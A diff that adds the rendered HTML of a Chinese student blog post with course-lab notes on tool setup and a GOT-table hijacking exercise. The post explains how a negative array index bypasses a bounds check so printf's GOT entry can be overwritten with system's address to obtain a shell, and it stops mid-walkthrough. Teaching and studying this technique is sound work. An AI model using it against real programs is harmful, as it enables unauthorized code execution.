@@ -1,37 +1,1189 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="二进制," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本系列文章主要记载2021年夏季学期网络安全综合实践课程设计的学习过程。 安装虚拟机去官网下载vmvare，然后新建ubantu虚拟机 安装vim打开终端，输入sudo apt-get install vim以安装。 安装成功后，随便新建一个文件，在终端输入vim [文件名]以编辑它。 按i进入编辑模式，编辑完成后，按esc键退出编辑模式并输入:wq保存并退出。  Q: How do you ge">
+<meta property="og:type" content="article">
+<meta property="og:title" content="本科网络安全课实验">
+<meta property="og:url" content="https://jameci.github.io/2023/01/17/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/index.html">
+<meta property="og:site_name" content="Jameci&#39;s Blog">
+<meta property="og:description" content="本系列文章主要记载2021年夏季学期网络安全综合实践课程设计的学习过程。 安装虚拟机去官网下载vmvare，然后新建ubantu虚拟机 安装vim打开终端，输入sudo apt-get install vim以安装。 安装成功后，随便新建一个文件，在终端输入vim [文件名]以编辑它。 按i进入编辑模式，编辑完成后，按esc键退出编辑模式并输入:wq保存并退出。  Q: How do you ge">
+<meta property="og:locale">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/0.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/1.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/2.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/3.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/4.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/5.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/6.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/7.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/8.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/9.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/10.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/11.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/12.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/13.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/14.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/15.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/16.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/17.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/18.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/19.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/20.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/21.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/22.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/23.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/24.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/25.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/26.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/27.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/28.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/29.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/30.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/31.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/32.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/33.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/34.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/35.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/36.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/35.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/37.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/38.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/39.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/40.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/41.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/42.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/43.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/44.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/45.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/47.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/48.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/49.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/50.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/51.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/52.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/53.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/54.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/55.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/56.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/57.png">
+<meta property="og:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/58.png">
+<meta property="article:published_time" content="2023-01-17T06:00:33.000Z">
+<meta property="article:modified_time" content="2023-02-09T14:54:36.598Z">
+<meta property="article:author" content="Jameci">
+<meta property="article:tag" content="二进制">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jameci.github.io/images/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jameci.github.io/2023/01/17/本科网络安全课实验/"/>
+
+
+
+
+
+  <title>本科网络安全课实验 | Jameci's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jameci's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">天下雷行，物与无妄。先王以茂对时，育万物。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jameci.github.io/2023/01/17/%E6%9C%AC%E7%A7%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BE%E5%AE%9E%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jameci's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">本科网络安全课实验</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-01-17T14:00:33+08:00">
+                2023-01-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">课程笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本系列文章主要记载2021年夏季学期网络安全综合实践课程设计的学习过程。</p>
+<h1 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h1><p>去官网下载vmvare，然后新建ubantu虚拟机</p>
+<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><p>打开终端，输入sudo apt-get install vim以安装。</p>
+<p>安装成功后，随便新建一个文件，在终端输入vim [文件名]以编辑它。</p>
+<p>按i进入编辑模式，编辑完成后，按esc键退出编辑模式并输入:wq保存并退出。</p>
+<blockquote>
+<p>Q: How do you generate a random string?</p>
+</blockquote>
+<blockquote>
+<p>A: Put a Windows user in front of vi, and tell them to exit</p>
+</blockquote>
+<h1 id="安装g"><a href="#安装g" class="headerlink" title="安装g++"></a>安装g++</h1><p>用vim写了个hello world的c++版，但由于gcc无法编译.cpp文件，所以下载g++。</p>
+<p>在终端输入sudo apt-get install g++以安装。</p>
+<p>g++ [文件名].cpp -o [输出文件名]</p>
+<p>终于得到hello world了</p>
+<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>run：运行程序，指重新运行当前程序</p>
+<p>continue：继续运行程序，从当前位置运行程序，遇到断点后停止</p>
+<p>attach：调试正在运行的程序</p>
+<p>break：在某地址处下断点</p>
+<p>quit：退出gdb</p>
+<p>n/s：step over/step into，逐条运行汇编指令</p>
+<h2 id="安装peda插件"><a href="#安装peda插件" class="headerlink" title="安装peda插件"></a>安装peda插件</h2><p>使用如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p>然而我github被墙……</p>
+<p>安装之后可以更方便地在调试的时候看到寄存器什么的了。</p>
+<h1 id="安装IDA"><a href="#安装IDA" class="headerlink" title="安装IDA"></a>安装IDA</h1><p>地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hex-rays.com/products/ida/support/download_freeware/</span><br></pre></td></tr></table></figure>
+<p>下载完了之后，安装包是一个.run文件，需要使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 755 ****.run</span><br></pre></td></tr></table></figure>
+<p>授权，之后执行，安装</p>
+<p>根据实验介绍，本次实验给出了四个可执行的程序，当执行它们时，需要从键盘输入一行字符，即flag，如果flag输入正确程序会现实good，否则会显示error flag。</p>
+<p>本实验的目的就是得到这些字符。</p>
+<h1 id="Lab——1-1"><a href="#Lab——1-1" class="headerlink" title="Lab——1.1"></a>Lab——1.1</h1><p>使用ida打开lab1.1。</p>
+<p>先看main函数，如下图：</p>
+<p><img src="/images/本科网络安全课实验/0.png" alt=""></p>
+<p>前面的var_74，var_68什么的都是变量声明，从图中选中的push rbp开始解读：</p>
+<h1 id="got表劫持实验"><a href="#got表劫持实验" class="headerlink" title="got表劫持实验"></a>got表劫持实验</h1><p><em>之前写过的网络安全题都是去年网络安全综合实践这门课上布置的，从本篇开始，进入今年的内容，也就是笔者本人上课时老师布置的作业题</em></p>
+<p><strong>8月27日，lab1-1：got表</strong></p>
+<p>题目难度：<strong>简单</strong></p>
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>程序运行结果如下图，三次运行，每次先输入一个index，再输入一个value：</p>
+<p><img src="/images/本科网络安全课实验/1.png" alt=""></p>
+<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>使用checksec指令查看程序开启了哪些保护措施：</p>
+<p><img src="/images/本科网络安全课实验/2.png" alt=""></p>
+<p>我们能看到NX已经开启了，这意味着我们无法执行栈上的代码，因此经典的栈溢出已经不在我们的考虑范围只内了</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开ida，反编译分析其主要函数：</p>
+<p><img src="/images/本科网络安全课实验/3.png" alt=""></p>
+<p>我们能看到的是，读入函数进行了三次循环，每次将index读入v2中，将value读入v1中，我们猜测v2是数组下标。之后对v2做了越界检查，下标必须小于等于2，然后才给对应下标处赋值为v1</p>
+<p>我们还注意到v1的数据类型是llu，8字节长，数组的起始地址是0x601060</p>
+<p>看到这里，我们应该能意识到可以使用负数下标来绕过越界检查，从而对0x601060上方地址更低的位置进行修改。设修改位置为pos，有：</p>
+<p><code>pos = 601060 + 8 * v2</code></p>
+<p>当然，v2也可以是绝对值很大的负数，让8 * v2时产生溢出得到正数，这种手法也能做到对地址更大的位置进行修改</p>
+<p>但我们能够修改的位置好像只有bss段，由于NX保护机制的存在，堆栈上无法执行，代码段无法修改</p>
+<blockquote>
+<p>当然，刚开始做的时候是不明白NX保护机制的具体作用的，那时的思路是去修改代码段，结果浪费了一上午的时间</p>
+</blockquote>
+<p>之前的方法好像已经山穷水尽了，但我们仔细观察，还是能找到一些蛛丝马迹：</p>
+<p><img src="/images/本科网络安全课实验/4.png" alt=""></p>
+<p>代码中最后的printf函数，使用了一个我们熟悉的参数——“/bin/sh”。我们知道，调用system函数，再传入这个参数，就可以拿到我们想要的shell</p>
+<h2 id="GOT表劫持"><a href="#GOT表劫持" class="headerlink" title="GOT表劫持"></a>GOT表劫持</h2><h3 id="什么是GOT表"><a href="#什么是GOT表" class="headerlink" title="什么是GOT表"></a>什么是GOT表</h3><p>GOT表是数据段上的一个表，内部存着很多函数的真实地址，如我们经常使用的库函数printf，scanf，puts等</p>
+<h3 id="为什么会有GOT表"><a href="#为什么会有GOT表" class="headerlink" title="为什么会有GOT表"></a>为什么会有GOT表</h3><p>我们要知道：</p>
+<ul>
+<li><p>程序经常使用动态链接的方法来提高效率</p>
+</li>
+<li><p>动态链接时，链接库中的函数，用到了谁就加载谁，没用到就不加载</p>
+</li>
+<li><p>调用函数用的是plt表地址，plt表中指向的是got表，再由got表对应项去得到真实地址</p>
+</li>
+</ul>
+<p>既然程序用到谁就加载谁，那为什么不能直接写在一个表，还需要先plt表，再got表，使用两个表呢？原因是现代操作系统考虑到程序运行的安全，规定一旦程序运行，就不允许再修改代码段，但我们为了动态链接，又必须得在执行时修改函数的地址，因此我们只能写入bss段，当我们第一次调用某个函数时，先把它的真实地址写到bss段的got表里，在下次调用时，由代码段跳转到bss段，接着在got表里面拿到了真实的地址</p>
+<p>比较详细的介绍在这篇博客里：</p>
+<p><a href="https://baijiahao.baidu.com/s?id=1663915740492408592&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1663915740492408592&amp;wfr=spider&amp;for=pc</a></p>
+<h3 id="如何做到got表劫持"><a href="#如何做到got表劫持" class="headerlink" title="如何做到got表劫持"></a>如何做到got表劫持</h3><p>我们先考虑一个动态链接进来的函数是怎么被调用的，以puts函数举例：</p>
+<p>代码中的某个位置使用了call指令，地址为puts的plt表，可以在ida里面找到前面带下划线的_puts函数，点开它：</p>
+<p><img src="/images/本科网络安全课实验/5.png" alt=""></p>
+<p>我们可以看到_puts是在4004C0里面的，根据地址我们可以判断这是在代码段，验证了我们说plt表是程序一开始就写在代码段里的。</p>
+<p>那么，我们执行puts时，就会先执行这个_puts函数，里面只有一行指令，jmp到这个601018的位置</p>
+<p>直接点开：</p>
+<p><img src="/images/本科网络安全课实验/6.png" alt=""></p>
+<p>直接跳进了数据段，最前面有灰色的小字写着got plt，然后有一个变量名字叫off_601018，这个位置就是got表的位置，我们跳转到这里来，这个变量里存的就是got的真实地址。</p>
+<p><strong>那么什么是got表劫持呢？</strong></p>
+<p>如果我们能把got表里的puts函数地址给它改掉，改成read函数的地址，这样我们执行puts的时候，实际上就会偷梁换柱，执行的就是read</p>
+<p>那我们如果把这个地址改成system的地址，它就会执行system</p>
+<p>改成其它函数的地址，同样也会执行其它函数</p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>联系我们之前的线索，我们可以通过负数偏移量来修改601060之前的数据的值，然后紧接着有一个printf函数，里面的参数是我们心心念念的”/bin/sh”，所以，我们只需要让got表中本该是printf函数地址的地方，改为system的地址，那我们是不是就可以拿到shell了呢</p>
+<p>在got表里面直接找到printf函数地址存放的位置：</p>
+<p><img src="/images/本科网络安全课实验/7.png" alt=""></p>
+<p>0x601028 = 0x601060 - 0x8 * 7</p>
+<p>然后找到system的真实地址，这里可以使用gdb调试这个程序，在调试过程中，使用命令p system，输出system的地址：</p>
+<p><img src="/images/本科网络安全课实验/8.png" alt=""></p>
